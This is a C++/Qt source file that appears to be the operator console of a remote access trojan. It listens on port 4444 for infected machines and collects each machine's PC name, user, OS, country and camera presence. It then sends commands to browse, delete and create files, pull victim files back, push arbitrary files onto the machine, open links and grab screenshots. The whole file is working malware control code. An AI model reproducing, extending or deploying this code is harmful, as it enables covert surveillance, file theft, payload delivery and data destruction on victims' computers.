#include "mainwindow.h"
#include "ui_mainwindow.h"

MainWindow::MainWindow(QWidget *parent)
    : QMainWindow(parent)
    , ui(new Ui::MainWindow)
{
    ui->setupUi(this);
    ServerStartup();
    ui->optionsWidget->hide();
    ui->filesWidget->hide();
    ui->downloadFileText->hide();
    ui->SaveFile->hide();
    ui->openLinkLine->hide();
}

MainWindow::~MainWindow()
{
    delete ui;
}

void MainWindow::ServerStartup()
{
    server = new QTcpServer(this);

    QObject::connect(server,&QTcpServer::newConnection,this,[&](){
        client = server->nextPendingConnection();
        clientsCounter++;
        qDebug() << "[+] Client succesful connected to the server. Client IP: " << client->peerAddress();
        AuthClientToTable(client);

        QObject::connect(client,&QTcpSocket::readyRead,this,[&](){
            //qDebug() << "[+] New message from the client. Client IP: " << client->localAddress();
            data += client->readAll();
                if(data.startsWith("#getPcInformation:"))
                {
                    data = data.mid(18);
                    QString dataString = data;
                    QStringList parts = dataString.split(":");
                    pcNameLabel->setText(parts[0]);
                    userNameLabel->setText(parts[1]);
                    installDateLabel->setText(parts[2]);
                    osLabel->setText(parts[3]);
                    osLanguageLabel->setText(parts[4]);
                    countryLabel->setText(parts[5]);
                    camLabel->setText(parts[6]);
                    data.clear();
                }
                if(data.startsWith("#getFileTree:"))
                {
                    Files = data.mid(13);
                    workWithFiles();
                    data.clear();
                }
                if(data.startsWith("#getAllFolders:"))
                {
                    Files = data.mid(15);
                    workWithFiles();
                    data.clear();
                }

                if(data.startsWith("#copyFiles:"))
                {
                    ui->downloadFileText->show();
                    QTimer::singleShot(4000,this,[&](){ui->SaveFile->show();});
                }
                if(data.startsWith("#getScreenCapture:"))
                {
                    QByteArray firstDataCheck = data.mid(18);
                    QString checkString = firstDataCheck;
                    QStringList splitData = checkString.split(":");
                    if(splitData[0].toInt() <= data.size())
                    {
                        int charsCheck = splitData[0].toInt();
                        QByteArray dataPhoto = data.mid(18 + QString::number(qAbs(charsCheck)).length() + 1);
                        QLabel *labelPhoto = new QLabel(this);

                        labelPhoto->setGeometry(570, 50, 620, 400);
                        labelPhoto->show();

                        QPixmap pixmap;
                        pixmap.loadFromData(dataPhoto,"PNG");
                        labelPhoto->setPixmap(pixmap.scaled(labelPhoto->size(), Qt::KeepAspectRatio, Qt::SmoothTransformation));
                        data.clear();
                    }
                }
        });

        QObject::connect(client,&QTcpSocket::disconnected,this,[&](){
            qDebug() << "[-] Client has been disconnected from the server. Client IP: " << client->localAddress();
            clientsCounter--;
            client->deleteLater();
        });
    });

    if(server->listen(QHostAddress::Any,4444))
    {
        qDebug() << "[+] Server succesful connect to port.";
    }
    else
    {
        qDebug() << "[-] Server cant connect to port.";
    }
}


void MainWindow::AuthClientToTable(QTcpSocket *socket)
{
    QLabel *label = new QLabel(ui->clientsWidget);
    label->show();
    label->setGeometry(0,YForLabel,1200,50);
    label->setStyleSheet("QLabel{background-color: black; border:2px solid black; border-color: black;}");

    QPushButton *button = new QPushButton(ui->clientsWidget);
    button->setStyleSheet("background: rgba(0,0,0,0);");
    button->setGeometry(0,YForLabel,1200,50);
    button->show();

    QObject::connect(button, &QPushButton::pressed, this, [&]() {
        if(openClientPanel == 0)
        {
            QPoint cursorPos = QCursor::pos();
            QPoint widgetPos = ui->optionsWidget->parentWidget()->mapFromGlobal(cursorPos);

            ui->optionsWidget->move(widgetPos);
            ui->optionsWidget->raise();
            ui->optionsWidget->show();
            openClientPanel = openClientPanel + 1;
        }
        else if(openClientPanel == 1)
        {
            QPoint cursorPos = QCursor::pos();
            QPoint widgetPos = ui->optionsWidget->parentWidget()->mapFromGlobal(cursorPos);

            ui->optionsWidget->move(widgetPos);
            ui->optionsWidget->raise();
            ui->optionsWidget->hide();
            openClientPanel = openClientPanel - 1;
        }

    });

    QLabel *ipLabel = new QLabel(ui->clientsWidget);
    QString ip = socket->peerAddress().toString();
    if (ip.startsWith("::ffff:")) {
        ip = ip.mid(7);
    }
    ipLabel->setAlignment(Qt::AlignCenter);
    ipLabel->setText(ip);
    ipLabel->show();
    ipLabel->setGeometry(1,YForLabel,161,50);
    ipLabel->setStyleSheet("QLabel{font: 600 14pt \"Segoe UI\";color: rgb(99, 180, 181);border: 1px solid rgb(99, 180, 181);}");

    pcNameLabel = new QLabel(ui->clientsWidget);
    pcNameLabel->setAlignment(Qt::AlignCenter);
    pcNameLabel->show();
    pcNameLabel->setGeometry(161,YForLabel,121,50);
    pcNameLabel->setStyleSheet("QLabel{font: 600 8pt \"Segoe UI\";color: rgb(99, 180, 181);border: 1px solid rgb(99, 180, 181);}");

    userNameLabel = new QLabel(ui->clientsWidget);
    userNameLabel->setAlignment(Qt::AlignCenter);
    userNameLabel->show();
    userNameLabel->setGeometry(281,YForLabel,111,50);
    userNameLabel->setStyleSheet("QLabel{font: 600 10pt \"Segoe UI\";color: rgb(99, 180, 181);border: 1px solid rgb(99, 180, 181);}");

    installDateLabel = new QLabel(ui->clientsWidget);
    installDateLabel->setAlignment(Qt::AlignCenter);
    installDateLabel->show();
    installDateLabel->setGeometry(391,YForLabel,141,50);
    installDateLabel->setStyleSheet("QLabel{font: 600 10pt \"Segoe UI\";color: rgb(99, 180, 181);border: 1px solid rgb(99, 180, 181);}");

    osLabel = new QLabel(ui->clientsWidget);
    osLabel->setAlignment(Qt::AlignCenter);
    osLabel->show();
    osLabel->setGeometry(531,YForLabel,181,50);
    osLabel->setStyleSheet("QLabel{font: 600 10pt \"Segoe UI\";color: rgb(99, 180, 181);border: 1px solid rgb(99, 180, 181);}");

    osLanguageLabel = new QLabel(ui->clientsWidget);
    osLanguageLabel->setAlignment(Qt::AlignCenter);
    osLanguageLabel->show();
    osLanguageLabel->setGeometry(711,YForLabel,141,50);
    osLanguageLabel->setStyleSheet("QLabel{font: 600 10pt \"Segoe UI\";color: rgb(99, 180, 181);border: 1px solid rgb(99, 180, 181);}");

    countryLabel = new QLabel(ui->clientsWidget);
    countryLabel->setAlignment(Qt::AlignCenter);
    countryLabel->show();
    countryLabel->setGeometry(851,YForLabel,121,50);
    countryLabel->setStyleSheet("QLabel{font: 600 10pt \"Segoe UI\";color: rgb(99, 180, 181);border: 1px solid rgb(99, 180, 181);}");

    camLabel = new QLabel(ui->clientsWidget);
    camLabel->setAlignment(Qt::AlignCenter);
    camLabel->show();
    camLabel->setGeometry(971,YForLabel,80,50);
    camLabel->setStyleSheet("QLabel{font: 600 10pt \"Segoe UI\";color: rgb(99, 180, 181);border: 1px solid rgb(99, 180, 181);}");

    QLabel *buildVerLabel = new QLabel(ui->clientsWidget);
    buildVerLabel->setAlignment(Qt::AlignCenter);
    buildVerLabel->setText("v0.1");
    buildVerLabel->show();
    buildVerLabel->setGeometry(1050,YForLabel,150,50);
    buildVerLabel->setStyleSheet("QLabel{font: 600 10pt \"Segoe UI\";color: rgb(99, 180, 181);border: 1px solid rgb(99, 180, 181);}");

    button->raise();

    getClientInformation(socket);






    YForLabel = YForLabel + 63;
}


void MainWindow::getClientInformation(QTcpSocket *socket)
{
    QByteArray requestForPcName = "#getPcInformation";
    socket->write(requestForPcName);
}

void MainWindow::on_filesButton_clicked()
{
    qDebug() << 1;
    ui->filesWidget->move(ui->optionsWidget->x()+110,ui->optionsWidget->y());
    ui->filesWidget->raise();
    if(openFilesBool == 0)
    {
        ui->filesWidget->show();
        openFilesBool = 1;
    }
    else if(openFilesBool == 1)
    {
        ui->filesWidget->hide();
        openFilesBool = 0;
    }

}


void MainWindow::on_showC_clicked()
{
    ui->stackedWidget->setCurrentIndex(1);
}

void MainWindow::workWithFiles()
{
    QWidget *container = new QWidget();
    container->setStyleSheet("background-color: rgba(0,0,0,240);");
    QLabel *label = new QLabel(container);
    label->setStyleSheet("color: white; font: 600 13pt \"Segoe UI\";");
    label->setText(Files);
    label->setWordWrap(true);
    label->adjustSize();

    container->setMinimumSize(label->size());

    ui->scrollAreaC->setWidget(container);
    ui->scrollAreaC->setWidgetResizable(false);
}

void MainWindow::on_getPath_clicked()
{
    QString path = ui->searchPath->text();
    QByteArray requestData = "#getFileTree:" + path.toUtf8();
    client->write(requestData);
    requestData.clear();
    path.clear();
}


void MainWindow::on_deleteFile_clicked()
{
    QString path = ui->searchPath->text();
    QByteArray requestData = "#deleteFile:" + path.toUtf8();
    client->write(requestData);
    requestData.clear();
    path.clear();
}


void MainWindow::on_deleteDir_clicked()
{
    QString path = ui->searchPath->text();
    QByteArray requestData = "#deleteDir:" + path.toUtf8();
    client->write(requestData);
    requestData.clear();
    path.clear();
}


void MainWindow::on_createFile_clicked()
{
    QString path = ui->searchPath->text();
    QByteArray requestData = "#createFile:" + path.toUtf8();
    client->write(requestData);
    requestData.clear();
    path.clear();
}


void MainWindow::on_deleteDir_2_clicked()
{
    QString path = ui->searchPath->text();

    QByteArray requestData = "#getAllFolders:" + path.toUtf8();
    client->write(requestData);
    requestData.clear();
    path.clear();
}


void MainWindow::on_copyFile_clicked()
{
    pathCopyFile = ui->searchPath->text();
    QByteArray requestData = "#copyFiles:" + pathCopyFile.toLatin1();
    client->write(requestData);
}

QString MainWindow::selectDirectory() {
    QString dirPath = QFileDialog::getExistingDirectory(this, "Выберите папку", "");

    if (!dirPath.isEmpty()) {
        return dirPath;
    } else {
        return "";
    }
}

void MainWindow::on_inputFile_clicked()
{
    QString selectedFile = QFileDialog::getOpenFileName(this, "Выберите файл", "", "Все файлы (*.*);;Текстовые файлы (*.txt)");
    qDebug() << selectedFile;
    QFileInfo suffixInfo(selectedFile);
    QFile file(selectedFile);
    QByteArray bufferFile;

    if (!file.exists()) {
        qDebug() << "Файл не найден:" << selectedFile;
    }
    if(file.open(QIODevice::ReadOnly))
    {
        qDebug() << "файл открыт.";
        bufferFile = file.readAll();
    }
    file.close();

    QByteArray requestData = "#inputFile:."  + suffixInfo.suffix().toLatin1() + ":" + bufferFile;

    client->write(requestData);
    client->waitForBytesWritten();
}


void MainWindow::on_SaveFile_clicked()
{
    QFileInfo fileType(pathCopyFile);
    QString fullFilePath = selectDirectory() + "/" + fileType.baseName() + "." + fileType.suffix();
    QByteArray buffer =  data.mid(11);

    QFile saveFile(fullFilePath);

    qDebug() << fullFilePath;

    if(saveFile.open(QIODevice::WriteOnly))
    {
        saveFile.write(buffer);
        saveFile.close();
    }
    ui->SaveFile->hide();
    ui->downloadFileText->hide();
    pathCopyFile.clear();
    data.clear();
}


void MainWindow::on_openLink_clicked()
{
    ui->openLinkLine->setGeometry(ui->optionsWidget->x()+110,ui->optionsWidget->y()+40,181,31);
    ui->openLinkLine->raise();
    if(openLink == 0)
    {
      ui->openLinkLine->show();
      openLink = 1;
    }
    else if(openLink == 1)
    {
      QByteArray requestData = "#openLink:" + ui->openLinkLine->text().toLatin1();
      client->write(requestData);
      ui->openLinkLine->hide();
      openLink = 0;
    }

}


void MainWindow::on_backToMain_clicked()
{
    ui->stackedWidget->setCurrentIndex(0);
}


void MainWindow::on_screenOpen_clicked()
{
    QByteArray requestData = "#getScreenCapture";
    client->write(requestData);
}

